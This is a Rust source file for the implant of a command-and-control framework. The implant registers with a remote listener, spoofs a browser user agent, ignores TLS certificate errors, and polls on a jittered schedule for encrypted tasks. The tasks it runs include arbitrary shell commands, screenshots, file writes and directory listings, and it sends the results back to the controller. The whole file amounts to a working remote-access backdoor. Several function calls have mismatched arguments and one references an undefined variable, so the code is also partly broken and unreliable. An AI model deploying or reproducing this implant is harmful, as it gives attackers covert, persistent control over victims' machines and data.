use chrono::Local;
use reqwest::header::{HeaderMap, HeaderValue, CONTENT_TYPE, USER_AGENT};
use reqwest::Client;
use std::{collections::HashMap, fs, fs::File, io::{self, Error, ErrorKind, Write}, process::Command, thread, time};
use x25519_dalek::{EphemeralSecret, PublicKey, SharedSecret, StaticSecret};

use crate::{
    config::listener,
    core::{
        postdata::{CipherData, PlainData, RegisterAgentData},
        tasks::{linux::shell::shell, screenshot::screenshot},
    },
    crypto::aesgcm::{cipher, decipher, EncMessage},
    utils::random::{random_name, random_sleeptime},
    utils::uuid::uuid_from_mac,
    Config,
};

pub async fn run(config: Config) -> Result<(), Error> {
    // Get agent into for registration
    let agent_uuid = uuid_from_mac();

    let hostname = match Command::new("hostname").output() {
        Ok(h) => String::from_utf8(h.stdout).unwrap().trim().to_string(),
        _ => String::from("unknown"),
    };
    let os = std::env::consts::OS.to_string();
    let arch = std::env::consts::ARCH.to_string();
    let listener_url = format!(
        "{}://{}:{}/",
        config.listener.proto.to_string(),
        config.listener.host.to_string(),
        config.listener.port.to_owned(),
    );

    let rad = RegisterAgentData::new(
        agent_uuid.to_string(),
        hostname,
        os,
        arch,
        listener_url.to_string(),
        config.my_public_key,
    );

    let rad_json = serde_json::to_string(&rad.clone()).unwrap();

    let ua = config.listener.user_agent.clone();
    let mut headers = HeaderMap::new();
    headers.insert(CONTENT_TYPE, HeaderValue::from_static("application/json"));
    headers.insert(
        USER_AGENT,
        HeaderValue::from_static(
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
        ),
    );

    let client = Client::builder().danger_accept_invalid_certs(true).build();

    // Agent registration process
    let mut registered = false;
    while !registered {
        tokio::time::sleep(random_sleeptime(
            config.sleep.to_owned(),
            config.jitter.to_owned(),
        ))
        .await;

        match config.listener.proto.as_str() {
            "mTLS" => {}
            "dns" => {}
            _ => {
                // Register agent
                let client = Client::builder().danger_accept_invalid_certs(true).build();

                let response = client
                    .unwrap()
                    .post(listener_url.clone() + "r")
                    .headers(headers.clone())
                    .body(rad_json.clone())
                    .send()
                    .await;

                match response {
                    Ok(res) => {
                        if res.status().is_success() {
                            registered = true;
                            let response_text = res.text().await;
                        }
                    }
                    Err(e) => {
                        // println!("Error: {:?}", e);
                        return Ok(());
                    }
                }
            }
        }
    }

    loop {
        // TODO: Implement graceful shutdown

        tokio::time::sleep(random_sleeptime(
            config.sleep.to_owned(),
            config.jitter.to_owned(),
        ))
        .await;

        let plain_data = PlainData::new(
            agent_uuid.to_string(),
            Local::now().format("%H:%M:%S").to_string(),
        );
        let plain_data_json = serde_json::to_string(&plain_data).unwrap();

        // Get task
        let client = Client::builder().danger_accept_invalid_certs(true).build();

        let response = client
            .unwrap()
            .post(listener_url.clone() + "t/a")
            .headers(headers.clone())
            .body(plain_data_json.clone())
            .send()
            .await;

        let task = match response {
            Ok(res) => {
                let result_text = res.text().await.unwrap();

                if result_text.clone() == "" {
                    continue;
                }

                let cipher_data: CipherData = serde_json::from_str(&result_text.clone()).unwrap();
                let deciphered_task = decipher(
                    EncMessage {
                        ciphertext: cipher_data.c,
                        nonce: cipher_data.n,
                    },
                    config.my_secret_key.clone(),
                    config.server_public_key.clone(),
                );
                String::from_utf8(deciphered_task)?
            }
            Err(e) => {
                // 重新注册，服务端掉了，马不掉
                let mut reg_bool = false;

                while !reg_bool {
                    let client = Client::builder().danger_accept_invalid_certs(true).build();

                    let response = client
                        .unwrap()
                        .post(listener_url.clone() + "r")
                        .headers(headers.clone())
                        .body(rad_json.clone())
                        .send()
                        .await;

                    match response {
                        Ok(res) => {
                            if res.status().is_success() {
                                reg_bool = true;
                                let response_text = res.text().await;
                            }
                        }
                        Err(e) => {
                            // println!("Error: {:?}", e);
                        }
                    }
                }

                continue;
            }
        };

        // println!("Task: {task}");

        // Execute task
        let task_args = match shellwords::split(&task) {
            Ok(args) => args,
            Err(_) => continue,
        };

        if task_args.len() == 0 {
            continue;
        }

        match task_args[0].as_str() {
            "cd" => match std::env::set_current_dir(task_args[1].as_str()) {
                Ok(_) => {
                    post_task_result(
                        "The current directory changed successfully.".as_bytes(),
                        agent_uuid.to_string(),
                        listener_url.to_string(),
                        headers.clone(),
                        config.my_secret_key.clone(),
                        config.server_public_key.clone(),
                        &client,
                    )
                    .await;
                }
                Err(e) => {
                    post_task_result(
                        e.to_string().as_bytes(),
                        agent_uuid.to_string(),
                        listener_url.to_string(),
                        headers.clone(),
                        config.my_secret_key.clone(),
                        config.server_public_key.clone(),
                        &client,
                    )
                    .await;
                }
            },
            "ls" => match std::fs::read_dir(task_args[1].as_str()) {
                Ok(result) => {
                    let mut output = String::new();
                    output = output + "\n";
                    for path in result {
                        if let Ok(entry) = path {
                            let entry_name = entry
                                .path()
                                .to_string_lossy()
                                .split("/")
                                .last()
                                .unwrap()
                                .to_string();
                            if let Ok(metadata) = entry.metadata() {
                                output = output
                                    + format!("{:<20} {}\n", entry_name, metadata.len()).as_str();
                            } else {
                                output = output + format!("{}", entry_name).as_str();
                            }
                        }
                    }

                    post_task_result(
                        output.as_bytes(),
                        agent_uuid.to_string(),
                        listener_url.to_string(),
                        headers.clone(),
                        config.my_secret_key.clone(),
                        config.server_public_key.clone(),
                        &client,
                    )
                    .await;
                }
                Err(e) => {
                    post_task_result(
                        e.to_string().as_bytes(),
                        agent_uuid.to_string(),
                        listener_url.to_string(),
                        headers.clone(),
                        config.my_secret_key.clone(),
                        config.server_public_key.clone(),
                        &client,
                    )
                    .await;
                }
            },
            "pwd" => match std::env::current_dir() {
                Ok(result) => {
                    post_task_result(
                        result.to_str().unwrap().as_bytes(),
                        agent_uuid.to_string(),
                        listener_url.to_string(),
                        headers.clone(),
                        config.my_secret_key.clone(),
                        config.server_public_key.clone(),
                        &client,
                    )
                    .await;
                }
                Err(e) => {
                    post_task_result(
                        e.to_string().as_bytes(),
                        agent_uuid.to_string(),
                        listener_url.to_string(),
                        headers.clone(),
                        config.my_secret_key.clone(),
                        config.server_public_key.clone(),
                        &client,
                    )
                    .await;
                }
            },
            "screenshot" => match screenshot().await {
                Ok(result) => {
                    post_task_result(
                        &result,
                        agent_uuid.to_string(),
                        listener_url.to_string(),
                        headers.clone(),
                        config.my_secret_key.clone(),
                        config.server_public_key.clone(),
                        &client,
                    )
                    .await;
                }
                Err(e) => {
                    post_task_result(
                        e.to_string().as_bytes(),
                        agent_uuid.to_string(),
                        listener_url.to_string(),
                        headers.clone(),
                        config.my_secret_key.clone(),
                        config.server_public_key.clone(),
                        &client,
                    )
                    .await;
                }
            },
            "shell" => match shell(task_args[1..].join(" ").to_string()).await {
                Ok(result) => {
                    post_task_result(
                        &result,
                        agent_uuid.to_string(),
                        listener_url.to_string(),
                        headers.clone(),
                        config.my_secret_key.clone(),
                        config.server_public_key.clone(),
                        &client,
                    )
                    .await;
                }
                Err(e) => {
                    post_task_result(
                        e.to_string().as_bytes(),
                        agent_uuid.to_string(),
                        listener_url.to_string(),
                        headers.clone(),
                        config.my_secret_key.clone(),
                        config.server_public_key.clone(),
                        &client,
                    )
                    .await;
                }
            },
            "sleep" => {
                let parts: Vec<&str> = task_args[1].split(',').collect();
                config.sleep = parts[0].parse().unwrap();
                config.jitter = parts[1].parse().unwrap();
                println!("sleep = {}, jitter = {}", config.sleep, config.jitter);
                post_task_result(
                    listener_url.clone(),
                    "Set delay successfully.".as_bytes(),
                    headers.clone(),
                    agent_uuid.to_string(),
                    config.my_secret_key.clone(),
                    config.server_public_key.clone(),
                )
                .await;
            }
            "upload" => {
                let parts: Vec<&str> = task_args[1].split(',').collect();
                let file_name: String = parts[0].parse()?;
                let gzip_data_qi4l: String = parts[1].parse()?;
                let gzip_data_qi5l = base64::decode(&gzip_data_qi4l).unwrap();


                let decompressed_data = crate::core::run_windows::decompress_from_gzip(&gzip_data_qi5l);
                match decompressed_data {
                    Ok(decompressed_data) => {
                        match fs::write(file_name.clone(), &decompressed_data) {
                            Ok(_) => {}
                            Err(e) => {
                                // println!("Error writing file: {}", e);
                            }
                        };
                    }
                    Err(e) => {
                        // println!("Error reading file: {}", e);
                    }
                }


                let req_qi4l = format!("File {} uploaded successfully", file_name.clone());

                post_task_result(
                    listener_url.clone(),
                    req_qi4l.as_bytes(),
                    headers.clone(),
                    agent_uuid.to_string(),
                    config.my_secret_key.clone(),
                    config.server_public_key.clone(),
                )
                    .await;
            }
            "whoami" => match crate::core::tasks::win::shell::shell("whoami".to_string()).await {
                Ok(result) => {
                    post_task_result(
                        listener_url.clone(),
                        &result,
                        headers.clone(),
                        agent_uuid.to_string(),
                        config.my_secret_key.clone(),
                        config.server_public_key.clone(),
                    )
                        .await;
                }
                Err(e) => {
                    post_task_result(
                        listener_url.clone(),
                        e.to_string().as_bytes(),
                        headers.clone(),
                        agent_uuid.to_string(),
                        config.my_secret_key.clone(),
                        config.server_public_key.clone(),
                    )
                        .await;
                }
            },
            _ => {
                continue;
            }
        }
    }
}

async fn post_task_result(
    plain_data: &[u8],
    agent_uuid: String,
    listener_url: String,
    headers: HeaderMap,
    my_secret_key: StaticSecret,
    server_public_key: PublicKey,
    client: &reqwest::Client,
) {
    let cipher_data = CipherData::new(agent_uuid, plain_data, my_secret_key, server_public_key);

    let _ = client
        .post(format!("{}{}", listener_url, "t/r"))
        .headers(headers)
        .json(&cipherdata)
        .send()
        .await;
}
